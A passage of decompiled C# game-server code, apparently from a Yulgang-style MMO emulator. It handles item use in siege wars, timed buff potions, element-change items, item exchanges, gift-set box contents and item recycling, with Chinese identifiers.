					if (!npc2.玩家是否在指定范围内(100, this))
					{
						发送提示文本("距离太远，无法使用");
						break;
					}
					物品使用(1, num24, 1);
					更新金钱和负重();
					npc2.Rxjh_HP -= 50000;
					npc2.发送怪物当前血量();
					if ((long)npc2.Rxjh_HP <= 0L)
					{
						npc2.发送死亡数据(base.人物全服ID);
					}
					break;
				}
				case 1008002195:
				{
					if (base.人物坐标_地图 != 42001)
					{
						新使用物品提示发送(num24, 1008002195, 10246, 1, num36);
						break;
					}
					if (base.帮派名字 != World.天魔神宫占领者)
					{
						发送提示文本("你是猴子请来的逗逼吧？帮守城的人修城门！");
						break;
					}
					if (World.攻城战进程 != 3)
					{
						新使用物品提示发送(num24, 1008002195, 10237, 1, num36);
						break;
					}
					if (num36 < 10000)
					{
						新使用物品提示发送(num24, 1008002195, 10258, 1, num36);
						break;
					}
					NpcClass npc = MapClass.GetNpc(base.人物坐标_地图, num36);
					if (npc == null)
					{
						新使用物品提示发送(num24, 1008002195, 10258, 1, num36);
						break;
					}
					if (npc.FLD_PID != 16430 && npc.FLD_PID != 16431 && npc.FLD_PID != 16435)
					{
						新使用物品提示发送(num24, 1008002195, 10258, 1, num36);
						break;
					}
					if (!npc.玩家是否在指定范围内(100, this))
					{
						发送提示文本("距离太远，无法使用");
						break;
					}
					if (npc.Rxjh_HP >= npc.Max_Rxjh_HP)
					{
						发送提示文本(npc.Name + "不需要修理");
						break;
					}
					if (npc.Rxjh_HP + 5000 > npc.Max_Rxjh_HP)
					{
						npc.Rxjh_HP = npc.Max_Rxjh_HP;
					}
					npc.Rxjh_HP += 50000;
					npc.发送怪物当前血量();
					物品使用(1, num24, 1);
					更新金钱和负重();
					break;
				}
				case 1008002196:
				{
					if (base.人物坐标_地图 != 42001)
					{
						新使用物品提示发送(num24, 1008002196, 10246, 1, num36);
						break;
					}
					if (base.武勋阶段 > 7)
					{
						新使用物品提示发送(num24, 1008002196, 10243, 1, num36);
						break;
					}
					if (追加状态列表.ContainsKey(1008002196))
					{
						新使用物品提示发送(num24, 1008002196, 10243, 1, num36);
						return;
					}
					追加状态类 追加状态类23 = new 追加状态类(this, 3600000, 1008002196, 0);
					追加状态列表.Add(追加状态类23.FLD_PID, 追加状态类23);
					发送攻城相关BUFF(this, 1008002196, DateTime.Now.AddSeconds(3600.0), 是否消失: false);
					吃药效果(1008002196);
					物品使用(1, num24, 1);
					更新武功和状态();
					更新人物数据(this);
					更新装备效果();
					break;
				}
				case 1008002197:
				{
					if (base.人物坐标_地图 != 42001)
					{
						新使用物品提示发送(num24, 1008002197, 10258, 1, num36);
						break;
					}
					if (World.攻城战进程 != 3)
					{
						新使用物品提示发送(num24, 1008002197, 10237, 1, num36);
						break;
					}
					if (num36 > 10000)
					{
						新使用物品提示发送(num24, 1008002197, 10242, 1, num36);
						break;
					}
					Players players11 = World.检查玩家世界ID(num36);
					if (players11 == null)
					{
						新使用物品提示发送(num24, 1008002197, 10242, 1, num36);
						break;
					}
					if (!玩家是否在指定范围内(400, players11))
					{
						发送提示文本("与对方距离过远，无法使用");
						break;
					}
					if (base.门派联盟盟主 == players11.门派联盟盟主)
					{
						新使用物品提示发送(num24, 1008002197, 10242, 1, num36);
						break;
					}
					坐标Class 坐标Class2 = new 坐标Class(base.人物坐标_X, base.人物坐标_Y, base.人物坐标_Z, base.人物坐标_地图);
					发送移动数据包(players11.人物坐标_X, players11.人物坐标_Y, players11.人物坐标_Z, players11.人物坐标_地图);
					守城城主是否在守城雕像附近();
					players11.发送移动数据包(坐标Class2.Rxjh_X, 坐标Class2.Rxjh_Y, 坐标Class2.Rxjh_Z, 坐标Class2.Rxjh_Map);
					players11.守城城主是否在守城雕像附近();
					吃药效果(1008002197);
					物品使用(1, num24, 1);
					更新武功和状态();
					更新人物数据(this);
					更新装备效果();
					break;
				}
				case 1100004:
				case 1008001040:
				case 1008002054:
				{
					if (时间药品.ContainsKey(1100004) || 时间药品.ContainsKey(1008001040) || 时间药品.ContainsKey(1008002054))
					{
						系统提示("相同属性的物品不能重复使用！");
						return;
					}
					uint 时间 = uint.Parse(DateTime.Parse(DateTime.Now.AddDays(1.0).ToShortDateString() + " 00:00:00").ToString("yyMMddHHmm"));
					时间药品类 时间药品类3 = new 时间药品类();
					时间药品类3.药品ID = num49;
					时间药品类3.时间 = 时间;
					时间药品类 时间药品类5 = 时间药品类3;
					时间药品.TryAdd(时间药品类5.药品ID, 时间药品类5);
					set时间物品(时间药品类5);
					物品使用(num13, num24, 1);
					RxjhClass.药品记录(base.Userid, base.UserName, num49, value.ItmeNAME, 1);
					break;
				}
				case 1008001626:
				case 1008001627:
				case 1008001628:
				case 1008001629:
				{
					int 物品ID2 = 0;
					int num9 = 0;
					switch (num49)
					{
					case 1008001626:
						物品ID2 = 1000001122;
						num9 = 1;
						break;
					case 1008001627:
						物品ID2 = 1000001123;
						num9 = 2;
						break;
					case 1008001628:
						物品ID2 = 1000001124;
						num9 = 3;
						break;
					case 1008001629:
						物品ID2 = 1000001125;
						num9 = 4;
						break;
					}
					if (装备栏已穿装备[3].Get物品ID == 0)
					{
						四神变更提示(num24, num49, 2);
						return;
					}
					物品类 物品类6 = 得到包裹物品(物品ID2);
					if (物品类6 == null)
					{
						四神变更提示(num24, num49, 3);
						return;
					}
					if (装备栏已穿装备[3].FLD_FJ_四神之力 == 0)
					{
						四神变更提示(num24, num49, 4);
						return;
					}
					if (装备栏已穿装备[3].FLD_FJ_四神之力 == num9)
					{
						四神变更提示(num24, num49, 5);
						return;
					}
					if (base.Player_Money < 5000000)
					{
						四神变更提示(num24, num49, 6);
						return;
					}
					if (base.人物坐标_地图 == 1201)
					{
						四神变更提示(num24, num49, 7);
						return;
					}
					if (RNG.Next(1, 100) > 20)
					{
						base.Player_Money -= 5000000L;
						装备栏已穿装备[3].FLD_FJ_四神之力 = num9;
						四神变更提示(num24, num49, 1);
						初始化已装备物品();
						更新金钱和负重();
					}
					else
					{
						四神变更提示(num24, num49, 8);
					}
					减去物品(num24, 1);
					减去物品(物品类6.物品位置, 1);
					RxjhClass.药品记录(base.Userid, base.UserName, num49, value.ItmeNAME, 1);
					return;
				}
				case 1008001630:
				case 1008001631:
				case 1008001632:
				case 1008001633:
				{
					int 物品ID = 0;
					int num2 = 0;
					switch (num49)
					{
					case 1008001630:
						物品ID = 1000001122;
						num2 = 1;
						break;
					case 1008001631:
						物品ID = 1000001123;
						num2 = 2;
						break;
					case 1008001632:
						物品ID = 1000001124;
						num2 = 3;
						break;
					case 1008001633:
						物品ID = 1000001125;
						num2 = 4;
						break;
					}
					if (装备栏已穿装备[0].Get物品ID == 0)
					{
						四神变更提示(num24, num49, 2);
						return;
					}
					物品类 物品类2 = 得到包裹物品(物品ID);
					if (物品类2 == null)
					{
						四神变更提示(num24, num49, 3);
						return;
					}
					if (装备栏已穿装备[0].FLD_FJ_四神之力 == 0)
					{
						四神变更提示(num24, num49, 4);
						return;
					}
					if (装备栏已穿装备[0].FLD_FJ_四神之力 == num2)
					{
						四神变更提示(num24, num49, 5);
						return;
					}
					if (base.Player_Money < 5000000)
					{
						四神变更提示(num24, num49, 6);
						return;
					}
					if (base.人物坐标_地图 == 1201)
					{
						四神变更提示(num24, num49, 7);
						return;
					}
					if (RNG.Next(1, 100) > 20)
					{
						base.Player_Money -= 5000000L;
						装备栏已穿装备[0].FLD_FJ_四神之力 = num2;
						四神变更提示(num24, num49, 1);
						初始化已装备物品();
						更新金钱和负重();
					}
					else
					{
						四神变更提示(num24, num49, 8);
					}
					减去物品(num24, 1);
					减去物品(物品类2.物品位置, 1);
					RxjhClass.药品记录(base.Userid, base.UserName, num49, value.ItmeNAME, 1);
					return;
				}
				case 1008001814:
				{
					if (追加状态列表.ContainsKey(1008001814))
					{
						系统提示("存在相同的药品！");
						return;
					}
					追加状态类 追加状态类51 = new 追加状态类(this, 7200000, 1008001814, 1);
					追加状态列表.Add(追加状态类51.FLD_PID, 追加状态类51);
					状态效果(BitConverter.GetBytes(1008001814), 1, 7200000);
					base.FLD_追加百分比_攻击 += 0.28;
					base.FLD_人物_追加_攻击 += 80;
					base.FLD_追加百分比_防御 += 0.3;
					base.FLD_人物_追加_防御 += 80;
					base.人物追加最大_HP += 3000;
					base.FLD_人物_武功攻击力增加百分比 += 0.35;
					base.FLD_人物_武功防御力增加百分比 += 0.23;
					base.FLD_人物_追加_经验百分比 += 2.1;
					base.FLD_人物_追加_吸魂几率百分比 += 10.0;
					更新武功和状态();
					物品使用(num13, num24, 1);
					break;
				}
				case 1008002064:
				{
					if (GetAddState(1008000055) || (GetAddState(1008002064) ? true : false))
					{
						系统提示("存在相同的药品！");
						return;
					}
					物品减去属性数量(num24, 1);
					追加状态类 追加状态类39 = new 追加状态类(this, 86400000, num49, 1);
					追加状态列表.Add(追加状态类39.FLD_PID, 追加状态类39);
					base.人物追加最大_HP += 1000;
					base.FLD_人物_追加_攻击 += 200;
					base.FLD_人物_追加_防御 += 200;
					base.FLD_人物_追加_经验百分比 += 1.0;
					状态效果(array, 1, 86400000);
					RxjhClass.药品记录(base.Userid, base.UserName, num49, value.ItmeNAME, 1);
					break;
				}
				case 1008002385:
					if (!妖花青草)
					{
						妖花青草 = true;
						追加状态类 追加状态类17 = new 追加状态类(this, 43200000, num49, 1);
						追加状态列表.Add(追加状态类17.FLD_PID, 追加状态类17);
						base.FLD_人物_追加_攻击 += 100;
						base.FLD_人物_追加_防御 += 100;
						base.人物追加最大_HP += 800;
						base.人物追加最大_MP += 800;
						base.FLD_人物_武功攻击力增加百分比 += 0.1;
						base.FLD_人物_追加_回避 += (int)((double)base.FLD_回避 * 0.05);
						base.FLD_人物_追加_经验百分比 += 0.4;
						状态效果(array, 1, 43200000);
						物品减去属性数量(num24, 1);
						更新武功和状态();
						更新广播人物数据();
						更新人物数据(this);
						更新装备效果();
						RxjhClass.药品记录(base.Userid, base.UserName, num49, value.ItmeNAME, 1);
					}
					return;
				case 1008002386:
					if (!妖花青草)
					{
						妖花青草 = true;
						追加状态类 追加状态类2 = new 追加状态类(this, 7200000, num49, 1);
						追加状态列表.Add(追加状态类2.FLD_PID, 追加状态类2);
						base.FLD_人物_追加_攻击 += 100;
						base.FLD_人物_追加_防御 += 100;
						base.人物追加最大_HP += 800;
						base.人物追加最大_MP += 800;
						base.FLD_人物_武功攻击力增加百分比 += 0.1;
						base.FLD_人物_追加_回避 += (int)((double)base.FLD_回避 * 0.05);
						base.FLD_人物_追加_经验百分比 += 0.4;
						状态效果(array, 1, 7200000);
						物品减去属性数量(num24, 1);
						更新武功和状态();
						更新广播人物数据();
						更新人物数据(this);
						更新装备效果();
						RxjhClass.药品记录(base.Userid, base.UserName, num49, value.ItmeNAME, 1);
					}
					return;
				default:
					try
					{
						foreach (物品兑换类 value33 in World.物品兑换.Values)
						{
							string[] array16 = value33.需要物品.Split(';');
							int num60 = 0;
							while (num60 < array16.Length)
							{
								if (array16[num60] != null && int.Parse(array16[num60].Split(',')[0]) == num49)
								{
									物品兑换检查(value33);
								}
								int num72 = num60 + 1;
								num60 = num72;
							}
						}
					}
					catch (Exception ex)
					{
						MainForm.WriteLine(2, "物品兑换系统出错--" + ex.Message);
					}
					return;
				}
				更新HP_MP_SP();
			}
			catch (Exception ex3)
			{
				MainForm.WriteLine(1, "吃药 出错 [" + base.Userid + "][" + base.UserName + "] [" + num + "]" + ex3.Message);
			}
		}

		public void 物品兑换检查(物品兑换类 物品兑换)
		{
			int num = 0;
			int num2 = 0;
			string[] array = 物品兑换.需要物品.Split(';');
			for (int i = 0; i < array.Length; i++)
			{
				if (array[i] == null)
				{
					continue;
				}
				string[] array2 = array[i].Split(',');
				for (int j = num2; j < 96; j++)
				{
					if (BitConverter.ToInt32(装备栏包裹[j].物品ID, 0) == int.Parse(array2[0]) && BitConverter.ToInt32(装备栏包裹[j].物品数量, 0) >= int.Parse(array2[1]))
					{
						num++;
						num2 = j + 1;
						break;
					}
				}
			}
			if (num == array.Length)
			{
				for (int k = 0; k < num; k++)
				{
					string[] array3 = array[k].Split(',');
					for (int l = 0; l < 96; l++)
					{
						if (BitConverter.ToInt32(装备栏包裹[l].物品ID, 0) == int.Parse(array3[0]))
						{
							减去物品(l, int.Parse(array3[1]));
							break;
						}
					}
				}
				兑换物品(物品兑换);
			}
			else
			{
				系统提示("材料不全, 不能兑换。");
			}
		}

		public bool 物品兑换检查2(物品兑换类 物品兑换)
		{
			CheckTreasureGems();
			int num = 0;
			int num2 = 0;
			string[] array = 物品兑换.需要物品.Split(';');
			for (int i = 0; i < array.Length; i++)
			{
				if (array[i] == null)
				{
					continue;
				}
				string[] array2 = array[i].Split(',');
				for (int j = num2; j < 96; j++)
				{
					if (BitConverter.ToInt32(装备栏包裹[j].物品ID, 0) == int.Parse(array2[0]) && BitConverter.ToInt32(装备栏包裹[j].物品数量, 0) >= int.Parse(array2[1]))
					{
						num++;
						num2 = j + 1;
						break;
					}
				}
			}
			if (base.FLD_RXPIONT < 物品兑换.元宝 && 物品兑换.增加 == 0)
			{
				系统提示("元宝不足" + 物品兑换.元宝);
				return true;
			}
			if (base.FLD_RXPIONTX < 物品兑换.积分 && 物品兑换.增加 == 0)
			{
				系统提示("钻石不足" + 物品兑换.积分);
				return true;
			}
			if (num == array.Length)
			{
				for (int k = 0; k < num; k++)
				{
					string[] array3 = array[k].Split(',');
					for (int l = 0; l < 96; l++)
					{
						if (BitConverter.ToInt32(装备栏包裹[l].物品ID, 0) == int.Parse(array3[0]))
						{
							减去物品(l, int.Parse(array3[1]));
							break;
						}
					}
				}
				兑换物品(物品兑换);
				return true;
			}
			系统提示("物品不全, 不能升级[或回收]。");
			return false;
		}

		public void 兑换物品(物品兑换类 物品兑换)
		{
			if (物品兑换.武勋 != 0)
			{
				if (物品兑换.增加 == 1)
				{
					base.Player_WuXun += 物品兑换.武勋;
					系统提示("增加武勋" + 物品兑换.武勋 + "点。");
				}
				else
				{
					base.Player_WuXun -= 物品兑换.武勋;
					系统提示("减少武勋" + 物品兑换.武勋 + "点。");
				}
				更新武功和状态();
			}
			if (物品兑换.元宝 != 0)
			{
				CheckTreasureGems();
				检察元宝数据(物品兑换.元宝, 物品兑换.增加, "兑换");
				RxjhClass.百宝记录(base.Userid, base.UserName, 0.0, "物品兑换", 1, 物品兑换.元宝);
				SaveGemData();
			}
			if (物品兑换.积分 != 0)
			{
				CheckTreasureGems();
				CheckGemPointsData(物品兑换.积分, 物品兑换.增加, "兑换");
				RxjhClass.百宝记录(base.Userid, base.UserName, 0.0, "兑换积分", 1, 物品兑换.积分);
				SaveGemData();
			}
			if (物品兑换.套装 != 0)
			{
				int num = GetEmptyBagSlot();
				if (num == -1)
				{
					系统提示("背包没有空位了。");
					return;
				}
				增加物品(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(物品兑换.套装), num, BitConverter.GetBytes(1), new byte[56], 绑定: true);
				系统提示("恭喜你获得一套装备。快快打开看吧。");
			}
			if (物品兑换.金钱.Length != 0)
			{
				if (物品兑换.增加 == 1)
				{
					base.Player_Money += long.Parse(物品兑换.金钱);
					系统提示("得到游戏币" + 物品兑换.金钱 + "两。");
					得到钱的提示(uint.Parse(物品兑换.金钱));
				}
				else
				{
					base.Player_Money -= long.Parse(物品兑换.金钱);
					系统提示("减少游戏币" + 物品兑换.金钱 + "两。");
				}
				更新金钱和负重();
			}
			if (物品兑换.系统公告.Length != 0)
			{
				World.发送游戏特殊公告(string.Format(物品兑换.系统公告, base.UserName), 物品兑换.颜色, "系统提示");
			}
			if (物品兑换.单件物品.Length == 0)
			{
				return;
			}
			string[] array = 物品兑换.单件物品.Split(';');
			for (int i = 0; i < Convert.ToInt32(array[1]); i++)
			{
				int num2 = GetEmptyBagSlot();
				if (num2 == -1)
				{
					系统提示("背包没有空位了。");
					break;
				}
				AddItemWithProperties(Convert.ToInt32(array[0]), num2, 1, Convert.ToInt32(array[2]), Convert.ToInt32(array[3]), Convert.ToInt32(array[4]), Convert.ToInt32(array[5]), Convert.ToInt32(array[6]), Convert.ToInt32(array[7]), Convert.ToInt32(array[8]), Convert.ToInt32(array[9]), Convert.ToInt32(array[10]), 0);
				人物发光();
				RxjhClass.进化记录(base.Userid, base.UserName, 2, 物品兑换.命令, Convert.ToInt32(array[0]));
			}
		}

		public int 取套装物品ID(int 职业, int level, int reside, int sex, int zx)
		{
			foreach (ItmeClass value in World.Itme.Values)
			{
				if (value.FLD_RESIDE1 == 职业 && value.FLD_RESIDE2 == reside && (value.FLD_SEX == sex || value.FLD_SEX == 0) && value.FLD_LEVEL == level && (value.FLD_ZX == zx || value.FLD_ZX == 0))
				{
					return value.FLD_PID;
				}
			}
			return 0;
		}

		public int 取套装物品ID2(int 职业, int level, int reside, int sex, int zx)
		{
			foreach (ItmeClass value in World.Itme.Values)
			{
				if (value.FLD_RESIDE1 == 职业 && value.FLD_RESIDE2 == reside && (value.FLD_SEX == sex || value.FLD_SEX == 0) && value.FLD_XW == level && (value.FLD_ZX == zx || value.FLD_ZX == 0))
				{
					return value.FLD_PID;
				}
			}
			return 0;
		}

		public void 发送套装(int job, int sex, int type, int zx, double 物品全局ID, int 物品ID, string 物品名, int 包ID, int 包位置)
		{
			try
			{
				物品使用(包ID, 包位置, 1);
				foreach (ItemSellClass item in World.套装数据)
				{
					if (item.Type != type)
					{
						continue;
					}
					int 物品ID2 = 0;
					switch (item.Reside)
					{
					case 1:
						switch (type)
						{
						case 1008000524:
							物品ID2 = 取套装物品ID(job, 10, 1, sex, zx);
							break;
						case 1502:
							物品ID2 = 取套装物品ID2(job, 169, 1, sex, zx);
							break;
						case 1503:
							物品ID2 = 取套装物品ID2(job, 169, 1, sex, zx);
							break;
						}
						break;
					case 2:
						switch (type)
						{
						case 1008000524:
							物品ID2 = ((job != 11) ? 500002 : 500102);
							break;
						case 1502:
							物品ID2 = 取套装物品ID2(job, 169, 2, sex, zx);
							break;
						case 1503:
							物品ID2 = 取套装物品ID2(job, 169, 2, sex, zx);
							break;
						}
						break;
					case 4:
						switch (type)
						{
						case 1008000524:
							switch (job)
							{
							case 1:
								物品ID2 = 100200003;
								break;
							case 2:
								物品ID2 = 200200003;
								break;
							case 3:
								物品ID2 = 300200003;
								break;
							case 4:
								物品ID2 = 400200003;
								break;
							case 5:
								物品ID2 = 500200003;
								break;
							case 6:
								物品ID2 = 700200003;
								break;
							case 7:
								物品ID2 = 800200010;
								break;
							case 8:
								物品ID2 = 100204002;
								break;
							case 9:
								物品ID2 = 200204002;
								break;
							case 10:
								物品ID2 = 900200010;
								break;
							case 11:
								物品ID2 = 400204002;
								break;
							case 12:
								物品ID2 = 300204002;
								break;
							case 13:
								物品ID2 = 500204002;
								break;
							}
							break;
						case 1502:
							物品ID2 = 取套装物品ID2(job, 169, 4, sex, zx);
							break;
						case 1503:
							物品ID2 = 取套装物品ID2(job, 169, 4, sex, zx);
							break;
						}
						break;
					case 5:
						switch (type)
						{
						case 1008000524:
							物品ID2 = ((job != 11) ? 800003 : 800103);
							break;
						case 1502:
							物品ID2 = 取套装物品ID2(job, 169, 5, sex, zx);
							break;
						case 1503:
							物品ID2 = 取套装物品ID2(job, 169, 5, sex, zx);
							break;
						}
						break;
					case 6:
						switch (type)
						{
						case 1008000524:
							物品ID2 = ((job != 11) ? 400001 : 400101);
							break;
						case 1502:
							物品ID2 = 取套装物品ID2(job, 169, 6, sex, zx);
							break;
						case 1503:
							物品ID2 = 取套装物品ID2(job, 169, 6, sex, zx);
							break;
						}
						break;
					case 7:
						if (type == 1502)
						{
							物品ID2 = ((job != 11) ? 100022 : 100120);
						}
						break;
					case 8:
						if (type == 1502)
						{
							物品ID2 = ((job != 11) ? 17 : 117);
						}
						break;
					case 10:
						if (type == 1502)
						{
							物品ID2 = ((job != 11) ? 700023 : 700123);
						}
						break;
					case 12:
						if (type == 1502)
						{
							物品ID2 = ((base.Player_Sex != 1) ? 26900672 : 16900084);
						}
						break;
					case 13:
						if (type == 1502)
						{
							物品ID2 = 900000283;
						}
						break;
					case 14:
						if (type == 1502)
						{
							物品ID2 = 900104;
						}
						break;
					case 15:
						if (type == 1502)
						{
							物品ID2 = 1000001380;
						}
						break;
					case 16:
						if (type == 1502)
						{
							物品ID2 = 1000001170;
						}
						break;
					}
					int num = GetEmptyBagSlot();
					if (num != -1)
					{
						AddItemWithProperties(物品ID2, num, 1, item.Magic0 + item.Magic1, item.Magic2, item.Magic3, item.Magic4, item.Magic5, item.觉醒, item.中级附魂, item.进化, item.BD, item.DAYS);
					}
				}
				switch (type)
				{
				case 1008000522:
					if (base.Player_Sex != 0)
					{
						AddItemWithProperties(1008000044, 得到行囊空位数(), 999, 0, 2010600000, 1020000200, 0, 0, 0, 0, 0, 0, 0);
						AddItemWithProperties(1008000045, 得到行囊空位数(), 999, 0, 2010600000, 1030000200, 0, 0, 0, 0, 0, 0, 0);
						AddItemWithProperties(1008000082, 得到行囊空位数(), 999, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
						AddItemWithProperties(1007000007, 得到行囊空位数(), 999, 0, 2000000008, 0, 0, 0, 0, 0, 0, 0, 0);
					}
					break;
				case 1008000523:
					if (base.Player_Sex != 0)
					{
						AddItemWithProperties(900000282, GetEmptyBagSlot(), 1, 0, 10000099, 20000099, 70000099, 80000003, 0, 0, 0, 0, 0);
						AddItemWithProperties(1000001383, GetEmptyBagSlot(), 1, 0, 10000300, 20000300, 110000300, 80000005, 0, 0, 0, 0, 0);
						AddItemWithProperties(1000001302, GetEmptyBagSlot(), 1, 190000099, 0, 0, 0, 0, 0, 0, 0, 0, 0);
					}
					break;
				case 1008000524:
					AddItemWithProperties(1008000522, GetEmptyBagSlot(), 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
					AddItemWithProperties(1008000312, GetEmptyBagSlot(), 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
					AddItemWithProperties(1008000534, GetEmptyBagSlot(), 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
					break;
				case 1008000531:
					if (base.Player_Sex != 0)
					{
						AddItemWithProperties(900000401, GetEmptyBagSlot(), 801, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
					}
					break;
				case 1008000532:
					气功书礼包();
					break;
				}
				RxjhClass.物品记录(base.Userid, base.UserName, base.Userid, base.UserName, 物品全局ID, 物品ID, 物品名, 1, "0", type, "打开套装");
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "打开套装出错--" + ex.Message);
			}
		}

		public void 发送套装2(int job, int sex, int type, int zx, double 物品全局ID, int 物品ID, string 物品名, int 包ID, int 包位置)
		{
			try
			{
				物品使用(包ID, 包位置, 1);
				foreach (ItemSellClass item in World.套装数据)
				{
					if (item.Type != type)
					{
						continue;
					}
					int 物品ID2 = 0;
					switch (item.Reside)
					{
					case 1:
						switch (type)
						{
						case 1008000535:
							物品ID2 = 取套装物品ID2(job, 79, 1, sex, zx);
							break;
						case 1008000555:
							物品ID2 = ((base.Player_Job <= 7) ? 取套装物品ID2(job, 89, 1, sex, zx) : 取套装物品ID2(job, 79, 1, sex, zx));
							break;
						case 1008000554:
							物品ID2 = 取套装物品ID2(job, 99, 1, sex, zx);
							break;
						case 1008000534:
							物品ID2 = 取套装物品ID2(job, 119, 1, sex, zx);
							break;
						case 1008000515:
							物品ID2 = 取套装物品ID2(job, 129, 1, sex, zx);
							break;
						case 1008000526:
							物品ID2 = 取套装物品ID2(job, 139, 1, sex, zx);
							break;
						case 1008000539:
							物品ID2 = 取套装物品ID2(job, 149, 1, sex, zx);
							break;
						case 1501:
							物品ID2 = 取套装物品ID2(job, 169, 1, sex, zx);
							break;
						}
						break;
					case 2:
						switch (type)
						{
						case 1008000535:
							物品ID2 = ((base.Player_Zx == 1) ? ((job != 11) ? 501009 : 500109) : ((job != 11) ? 502009 : 502109));
							break;
						case 1008000555:
							物品ID2 = ((base.Player_Zx == 1) ? ((job != 11) ? 501010 : 500110) : ((job != 11) ? 502010 : 502110));
							break;
						case 1008000554:
							物品ID2 = ((base.Player_Zx == 1) ? ((job != 11) ? 501011 : 500111) : ((job != 11) ? 502011 : 502111));
							break;
						case 1008000534:
							物品ID2 = ((base.Player_Zx == 1) ? ((job != 11) ? 501014 : 500114) : ((job != 11) ? 502014 : 502114));
							break;
						case 1008000515:
							物品ID2 = ((base.Player_Zx == 1) ? ((job != 11) ? 501015 : 500115) : ((job != 11) ? 502015 : 502115));
							break;
						case 1008000526:
							物品ID2 = ((base.Player_Zx == 1) ? ((job != 11) ? 501017 : 500117) : ((job != 11) ? 502017 : 502117));
							break;
						case 1008000539:
							物品ID2 = ((base.Player_Zx == 1) ? ((job != 11) ? 501019 : 500119) : ((job != 11) ? 502019 : 502119));
							break;
						case 1501:
							物品ID2 = 取套装物品ID2(job, 169, 2, sex, zx);
							break;
						}
						break;
					case 4:
						switch (type)
						{
						case 1008000535:
							物品ID2 = 取套装物品ID2(job, 79, 4, sex, zx);
							break;
						case 1008000555:
							物品ID2 = 取套装物品ID2(job, 79, 4, sex, zx);
							break;
						case 1008000554:
							物品ID2 = 取套装物品ID2(job, 99, 4, sex, zx);
							break;
						case 1008000534:
							物品ID2 = 取套装物品ID2(job, 119, 4, sex, zx);
							break;
						case 1008000515:
							物品ID2 = 取套装物品ID2(job, 129, 4, sex, zx);
							break;
						case 1008000526:
							物品ID2 = 取套装物品ID2(job, 139, 4, sex, zx);
							break;
						case 1008000539:
							物品ID2 = 取套装物品ID2(job, 149, 4, sex, zx);
							break;
						case 1501:
							物品ID2 = 取套装物品ID2(job, 169, 4, sex, zx);
							break;
						case 4150:
							物品ID2 = 取套装物品ID2(job, 169, 4, sex, zx);
							break;
						case 4160:
							物品ID2 = 取套装物品ID2(job, 179, 4, sex, zx);
							break;
						case 4170:
							物品ID2 = 取套装物品ID2(job, 189, 4, sex, zx);
							break;
						case 4180:
							物品ID2 = 取套装物品ID2(job, 199, 4, sex, zx);
							break;
						case 4190:
							物品ID2 = 取套装物品ID2(job, 209, 4, sex, zx);
							break;
						}
						break;
					case 5:
						switch (type)
						{
						case 1008000535:
							物品ID2 = ((base.Player_Zx == 1) ? ((job != 11) ? 801010 : 800110) : ((job != 11) ? 802010 : 802110));
							break;
						case 1008000555:
							物品ID2 = ((base.Player_Zx == 1) ? ((job != 11) ? 801011 : 800111) : ((job != 11) ? 802011 : 802111));
							break;
						case 1008000554:
							物品ID2 = ((base.Player_Zx == 1) ? ((job != 11) ? 801012 : 800112) : ((job != 11) ? 802012 : 802112));
							break;
						case 1008000534:
							物品ID2 = ((base.Player_Zx == 1) ? ((job != 11) ? 801015 : 800115) : ((job != 11) ? 802015 : 802115));
							break;
						case 1008000515:
							物品ID2 = ((base.Player_Zx == 1) ? ((job != 11) ? 801016 : 800116) : ((job != 11) ? 802016 : 802116));
							break;
						case 1008000526:
							物品ID2 = ((base.Player_Zx == 1) ? ((job != 11) ? 801018 : 800118) : ((job != 11) ? 802018 : 802118));
							break;
						case 1008000539:
							物品ID2 = ((base.Player_Zx == 1) ? ((job != 11) ? 801020 : 800120) : ((job != 11) ? 802020 : 802120));
							break;
						case 1501:
							物品ID2 = 取套装物品ID2(job, 169, 5, sex, zx);
							break;
						}
						break;
					case 6:
						switch (type)
						{
						case 1008000535:
							物品ID2 = ((job != 11) ? 400008 : 400108);
							break;
						case 1008000555:
							物品ID2 = ((job != 11) ? 400009 : 400109);
							break;
						case 1008000554:
							物品ID2 = ((job != 11) ? 400010 : 400110);
							break;
						case 1008000534:
							物品ID2 = ((job != 11) ? 400012 : 400112);
							break;
						case 1008000515:
							物品ID2 = ((job != 11) ? 400015 : 400115);
							break;
						case 1008000526:
							物品ID2 = ((job != 11) ? 400016 : 400116);
							break;
						case 1008000539:
							物品ID2 = ((job != 11) ? 400017 : 400117);
							break;
						case 1501:
							物品ID2 = 取套装物品ID(job, 169, 6, sex, zx);
							break;
						}
						break;
					case 7:
						if (type == 1501)
						{
							物品ID2 = ((job != 11) ? 100028 : 100125);
						}
						break;
					case 8:
						if (type == 1501)
						{
							物品ID2 = ((job != 11) ? 23 : 123);
						}
						break;
					case 10:
						if (type == 1501)
						{
							物品ID2 = ((job != 11) ? 700028 : 700128);
						}
						break;
					case 12:
						if (type == 1501)
						{
							物品ID2 = ((base.Player_Sex != 1) ? 26900672 : 16900084);
						}
						break;
					case 13:
						if (type == 1501)
						{
							物品ID2 = 900000283;
						}
						break;
					case 14:
						if (type == 1501)
						{
							物品ID2 = 900104;
						}
						break;
					case 15:
						if (type == 1501)
						{
							物品ID2 = 1000001380;
						}
						break;
					case 16:
						if (type == 1501)
						{
							物品ID2 = 1000001170;
						}
						break;
					}
					int num = GetEmptyBagSlot();
					if (num != -1)
					{
						AddItemWithProperties(物品ID2, num, 1, item.Magic0 + item.Magic1, item.Magic2, item.Magic3, item.Magic4, item.Magic5, item.觉醒, item.中级附魂, item.进化, item.BD, item.DAYS);
					}
				}
				RxjhClass.物品记录(base.Userid, base.UserName, base.Userid, base.UserName, 物品全局ID, 物品ID, 物品名, 1, "0", type, "打开套装2");
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "打开套装2出错--" + ex.Message);
			}
		}

		public void 一键回收物品()
		{
			CheckTreasureGems();
			int num = 0;
			int num2 = 0;
			foreach (物品回收类 value in World.物品回收数据.Values)
			{
				string[] array = value.需要物品.Split(',');
				for (int i = 0; i < 36; i++)
				{
					if (int.Parse(array[0]) == 装备栏包裹[i].Get物品ID && 装备栏包裹[i].Get物品数量 >= int.Parse(array[1]))
					{
						减去物品(i, 1);
						if (value.元宝 != 0 && base.FLD_RXPIONT != World.帐号总元宝上限)
						{
							num += value.元宝;
						}
